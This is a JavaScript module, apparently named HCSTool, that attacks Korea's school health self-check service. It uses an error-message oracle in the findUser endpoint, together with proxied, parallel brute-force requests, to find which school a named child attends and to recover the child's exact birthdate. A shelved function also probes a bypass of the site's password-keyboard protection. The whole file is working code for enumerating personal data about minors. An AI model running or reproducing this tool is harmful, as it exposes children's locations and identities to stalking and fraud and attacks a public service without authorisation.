const schools = require('./schools.json');
const { EventEmitter } = require('events');
const axios = require('axios-https-proxy-fix').default;
const crypto = require('crypto');
const codes = {
    "서울특별시": "sen",
    "부산광역시": "pen",
    "대구광역시": "dge",
    "인천광역시": "ice",
    "광주광역시": "gen",
    "대전광역시": "dje",
    "울산광역시": "use",
    "세종특별자치시": "sje",
    "경기도": "goe",
    "강원도": "kwe",
    "충청북도": "cbe",
    "충청남도": "cne",
    "전라북도": "jbe",
    "전라남도": "jne",
    "경상북도": "gbe",
    "경상남도": "gne",
    "제주특별자치도": "jje"
};
const lctnScCodes = {
    "서울특별시": "01",
    "부산광역시": "02",
    "대구광역시": "03",
    "인천광역시": "04",
    "광주광역시": "05",
    "대전광역시": "06",
    "울산광역시": "07",
    "세종특별자치시": "08",
    "경기도": "10",
    "강원도": "11",
    "충청북도": "12",
    "충청남도": "13",
    "전라북도": "14",
    "전라남도": "15",
    "경상북도": "16",
    "경상남도": "17",
    "제주특별자치도": "18"
};

module.exports = class HCSTool extends EventEmitter {
    constructor(proxy) {
        super();
        this.client = axios.create({
            proxy,
            headers: {
                "Connection": "keep-alive",
                "Accept": "application/json, text/plain, */*",
                "X-Requested-With": "XMLHttpRequest",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.104 Whale/3.13.131.36 Safari/537.36",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Origin": "https://hcs.eduro.go.kr",
                "Referer": "https://hcs.eduro.go.kr/",
            },
            timeout: 10000
        });
        this.keyIndex = "";
        this.searchKey = "";
        this.interval;
    };

    async getSchool(name, birthday, region = "", special = false) {
        let found = [];
        try {
            if ((!name || name.length < 2 || name.length > 4 || /[^가-힣]/.test(name))) throw new Error("이름을 다시 확인해 주세요.");
            if (!birthday || birthday.length !== 6 || /[^0-9]/.test(birthday)) throw new Error("생년월일을 다시 확인해 주세요.");
            birthday = [birthday.substring(0, 2), birthday.substring(2, 4), birthday.substring(4, 6)];
            if (Number(birthday[0]) < 4 || Number(birthday[0]) > 15) throw new Error("생년월일을 다시 확인해 주세요.");
            let schoolList = schools.filter(x => x.level == (special ? "특수" : Number(birthday[0]) <= 15 && Number(birthday[0]) >= 10 ? "초" : Number(birthday[0]) <= 9 && Number(birthday[0]) >= 7 ? "중" : "고"))
            // schoolList = !!region ? Object.keys(schoolList).filter(x => schoolList[x].region == region) : Object.keys(schoolList);
            schoolList = !!region ? schoolList.filter(x => x.region == region) : schoolList;
            schoolList = schoolList.reduce((all, one, i) => {
                const ch = Math.floor(i / 200);
                all[ch] = [].concat((all[ch] || []), one);
                return all
            }, []); //chunk
            let currentPage = 0;
            await this.setSearchKey();
            await this.setKeyIndex();
            if (!this.searchKey || !this.keyIndex) throw new Error("서버에 이상이 있습니다. 잠시 후 다시 시도해 주세요.");
            this.setKeyInterval();
            for (const chunk of schoolList) {
                currentPage++;
                this.emit("data", found, currentPage, schoolList.length);
                await Promise.all(chunk.map(async (school) => {
                    let result = await this.client.post(`https://${codes[school.region]}hcs.eduro.go.kr/v3/findUser`, {
                        "birthday": HCSTool.encrypt(birthday.join("")),
                        "deviceUuid": "",
                        "lctnScCode": lctnScCodes[school.region],
                        "loginType": "school",
                        "makeSession": true,
                        "name": HCSTool.encrypt(name),
                        "orgCode": school.code, // 원래 /v2/searchSchool 에 학교 정보를 넣어 요청해 얻어야 하지만 아무거나 넣어도 리스폰스에 정상적인 조회가 아니라면서 됨.
                        "orgName": school.name,
                        "password": JSON.stringify({
                            "raon": [{
                                "id": "password",
                                "enc": "",
                                "hmac": "",
                                "keyboardType": "number",
                                "keyIndex": this.keyIndex,
                                "fieldType": "password",
                                "seedKey": "",
                                "initTime": crypto.createHash('md5').update(Date.now().toString()).digest('hex'),
                                "ExE2E": "false"
                            }]
                        }),
                        "searchKey": this.searchKey,
                        "stdntPNo": null
                    }).catch((err) => {
                        if (err.response) return err.response;
                        else return false;
                    });
                    result && (result = result.data);
                    if (!!result && result.isError && (result.message.includes("정상적인 조회가 아닙니다") || result.statusCode == 252)) {
                        result = {
                            orgName: school.name,
                            orgCode: school.code,
                            scCode: codes[school.region],
                            region: school.region,
                            birthday: {
                                text: `${Number(birthday[0]) + 2000}년 ${birthday[1]}월 ${birthday[2]}일`,
                                year: Number(birthday[0]) + 2000,
                                month: birthday[1],
                                day: birthday[2]
                            },
                            foundAt: Date.now()
                        };
                        found.push(result);
                        this.emit("data", found, currentPage, schoolList.length);
                    };
                }));
            };
            this.emit("end", found)
        } catch (e) {
            this.emit("error", e, found)
        } finally {
            this.removeAllListeners();
            this.clearKeyInterval();
        };
    };

    async getBirthday(name, birthYear, school) {
        let found = [];
        try {
            if ((!name || name.length < 2 || name.length > 4 || /[^가-힣]/.test(name))) throw new Error("이름을 다시 확인해 주세요");
            if (Number(birthYear) < 4 || Number(birthYear) > 15) throw new Error("출생연도를 다시 확인해 주세요");
            birthYear.length <= 1 && (birthYear = `0${birthYear}`);
            school = HCSTool.findSchool(school)[0];
            if (!school) throw new Error("학교를 다시 확인해 주세요");
            await this.setSearchKey();
            await this.setKeyIndex();
            if (!this.searchKey || !this.keyIndex) throw new Error("서버에 이상이 있습니다. 잠시 후 다시 시도해 주세요.");
            this.setKeyInterval();
            const monthDays = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
            let currentPage = 0;
            for (let month = 0; month < monthDays.length; month++) {
                let array = new Array(monthDays[month]).fill(0, 0, monthDays[month]);
                for (let j = 0; j < monthDays[month]; j++) array[j] = j + 1;
                currentPage++;
                this.emit("data", found, currentPage, monthDays.length);
                await Promise.all(array.map(async day => {
                    let result = await this.client.post(`https://${codes[school.region]}hcs.eduro.go.kr/v3/findUser`, {
                        "birthday": HCSTool.encrypt(`${birthYear}${month < 9 ? "0" : ""}${month + 1}${day < 10 ? "0" : ""}${day}`),
                        "deviceUuid": "",
                        "lctnScCode": lctnScCodes[school.region],
                        "loginType": "school",
                        "makeSession": true,
                        "name": HCSTool.encrypt(name),
                        "orgCode": school.code,
                        "orgName": school.name,
                        "password": JSON.stringify({
                            "raon": [{
                                "id": "password",
                                "enc": "",
                                "hmac": "",
                                "keyboardType": "number",
                                "keyIndex": this.keyIndex,
                                "fieldType": "password",
                                "seedKey": "",
                                "initTime": crypto.createHash('md5').update(Date.now().toString()).digest('hex'),
                                "ExE2E": "false"
                            }]
                        }),
                        "searchKey": this.searchKey,
                        "stdntPNo": null
                    }).catch((err) => {
                        if (err.response) return err.response;
                        else return false;
                    });
                    result = result && result.data;
                    if (!!result && result.isError && (result.message.includes("정상적인 조회가 아닙니다") || result.statusCode == 252)) {
                        result = {
                            orgName: school.name,
                            orgCode: school.code,
                            scCode: codes[school.region],
                            region: school.region,
                            birthday: {
                                text: `${Number(birthYear) + 2000}년 ${month + 1}월 ${day}일`,
                                year: Number(birthYear) + 2000,
                                month: month + 1,
                                day: day
                            },
                            foundAt: Date.now()
                        };
                        found.push(result);
                        this.emit("data", found, currentPage, monthDays.length);
                    };
                }));
            };
            this.emit("end", found);
        } catch (e) {
            this.emit("error", e, found)
        } finally {
            this.removeAllListeners();
            this.clearKeyInterval();
        };
    }

    async setKeyIndex() {
        let data = await this.client.post("https://hcs.eduro.go.kr/transkeyServlet", `op=getKeyIndex&keyboardType=number&initTime=${crypto.createHash('md5').update(Date.now().toString()).digest('hex')}`).then(res => res.data).catch(() => false);
        data && (this.keyIndex = data);
    };

    async setSearchKey() {
        let data = await this.client.get("https://hcs.eduro.go.kr/v2/searchSchool?lctnScCode=--&schulCrseScCode=hcs%EC%99%9C%EC%9D%B4%EB%9F%AC%EB%83%90%E3%84%B9%E3%85%87%E3%85%8B%E3%85%8B&orgName=%ED%95%99%EA%B5%90%0A&loginType=school").then(res => res.data.key).catch(() => false);
        data && (this.searchKey = data);
    };

    setKeyInterval() {
        this.interval = setInterval(() => {
            this.setSearchKey();
            this.setKeyIndex();
        }, 90000);
    };

    clearKeyInterval() {
        clearInterval(this.interval);
    };

    static findSchool(query) {
        return schools.filter(school => school.name.includes(query) || school.code.includes(query) || (school.region + " " + school.name).includes(query) || (school.region + school.name).includes(query))
    };

    static encrypt(text) {
        return crypto.publicEncrypt({
            'key': Buffer.from([
                "-----BEGIN PUBLIC KEY-----",
                "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA81dCnCKt0NVH7j5Oh2+SGgEU0aqi5u6",
                "sYXemouJWXOlZO3jqDsHYM1qfEjVvCOmeoMNFXYSXdNhflU7mjWP8jWUmkYIQ8o3FGqMzsMTNxr",
                "+bAp0cULWu9eYmycjJwWIxxB7vUwvpEUNicgW7v5nCwmF5HS33Hmn7yDzcfjfBs99K5xJEppHG0",
                "qc+q3YXxxPpwZNIRFn0Wtxt0Muh1U8avvWyw03uQ/wMBnzhwUC8T4G5NclLEWzOQExbQ4oDlZBv",
                "8BM/WxxuOyu0I8bDUDdutJOfREYRZBlazFHvRKNNQQD2qDfjRz484uFs7b5nykjaMB9k/EJAuHj",
                "JzGs9MMMWtQIDAQAB",
                "-----END PUBLIC KEY-----"].join("\n"), 'utf-8'), 'padding': crypto.constants.RSA_PKCS1_PADDING
        }, Buffer.from(text, 'utf-8')).toString('base64');
    };
};

async function sendValidatePassword(token, code) { //잠시 보류
    try {
        if (!token || !code) throw new Error("잘못됨.");
        // let initTime = crypto.createHash('md5').update(Date.now().toString()).digest('hex'); //initTime은 abcdef1234567890로만 이루어져 있고, 32자 여야 함. (그냥 MD5로 암호화하면 됨. 값은 상관 X)
        // let transkeyUuid = crypto.randomBytes(128).toString("hex"); //transkeyUuid는 아무 값이나 입력해도 됨. 글자 수 제한 X. 문자 제한 X
        let headers = {
            "Connection": "keep-alive",
            "Authorization": "Bearer " + token,
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.104 Whale/3.13.131.36 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://hcs.eduro.go.kr",
            "Referer": "https://hcs.eduro.go.kr/",
        };
        let keyIndex = await axios.post("https://hcs.eduro.go.kr/transkeyServlet", `op=getKeyIndex&keyboardType=number&initTime=${crypto.createHash('md5').update(Date.now().toString()).digest('hex')}`, { proxy, headers }).then(res => res.data);
        headers["Content-Type"] = "application/json;charset=UTF-8";
        let res = await axios.post(`https://${code}hcs.eduro.go.kr/v2/validatePassword`, { "password": `{"raon":[{"id":"password","enc":"","hmac":"","keyboardType":"number","keyIndex":"${keyIndex}","fieldType":"password","seedKey":"","initTime":"${crypto.createHash('md5').update(Date.now().toString()).digest('hex')}","ExE2E":"false"}]}`, "deviceUuid": "", "makeSession": true }, { proxy, headers });
        //initTime이 다르면 되고, 같으면 안되네..?ㅋㅋㅋㅋ
        return res.data;
    } catch {
        return false;
    };
};
